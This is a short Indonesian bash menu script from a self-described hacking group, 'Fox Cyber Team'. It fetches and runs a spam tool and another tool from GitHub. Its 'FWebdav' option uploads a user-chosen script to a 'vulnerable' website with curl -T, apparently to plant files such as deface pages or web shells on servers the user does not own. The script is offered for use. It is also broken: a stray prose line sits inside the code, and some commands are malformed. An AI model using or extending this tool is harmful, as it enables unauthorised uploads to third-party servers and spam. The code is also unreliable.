#!/bin/bash
#version 1.0 "
echo "_____________________________________________________________"
echo •  "Tools    : KHESA TAMVAN $white         " |lolcat
echo •  "Creadby  : Fox Cyber Team $white   " |lolcat
echo •  "Contact  : 082297538971 $white " |lolcat
echo  "_____________________________________________________________"
echo " "
sleep 1
echo -o "1. Jones Tools";
echo "{•}================================={•} "  |lolcat
sleep 1
echo -o "2 . Fox spam";
echo "{•}================================={•} " |lolcat 
sleep 1
echo -o "3.. Fox webdav";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "4. info";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "5. exit";
echo " "
read -p "Tools@F-Tools:~#" command
if [ $command -eq 1 ];
	then
clear
echo "\033[34;1m"
cd
pkg install git
git clone https://github.com/RoboskijR/JTools
cd JTools
pkg install sh
sh JTools.sh
fi
if [ $command -eq 2 ];
	then
clear
echo "\033[32;1m"
cd
pkg install git
git clone https://github.com/RoboskijR/FSpamm
pkg install sh
cd FSpamm
sh FSpam.sh
fi
Nah buat yang ke 3 ini FWebdav

if [ $command -eq 3 ];
	then
clear
sleep 2
figlet FWebdav
sleep 1
read -p "Nama Script : " script
echo " "
sleep 1
read -p "Web Vuln : " web
sleep 2
curl -T /storage/emulated/0/$script $web
sleep 2
echo " "
echo "Keterangan : "
echo "Jika blank berarti sukses"
sleep 1
echo "Jika muncul eror gagal"
sleep 
fi
if [ $command -eq 4 ];
	then
sleep 1
echo "Thanks To All Member Fox Cyber"
sleep 1
echo "./Fx-Anonyfunk"
sleep 1
echo "./Fx-Roboski"
sleep 1
echo "./Fx-Ms 4D3V"
sleep 1
echo "./Fx-73R54K171"
sleep 1
echo "./Fx-Mr CL4�0"
sleep 1
echo "./Fx-Chuliex"
sleep 1
echo "./Fx-BL4KC4TD34D"
sleep 1
echo "./Fx-K3DU7"
sleep 3
sh FTools.sh
fi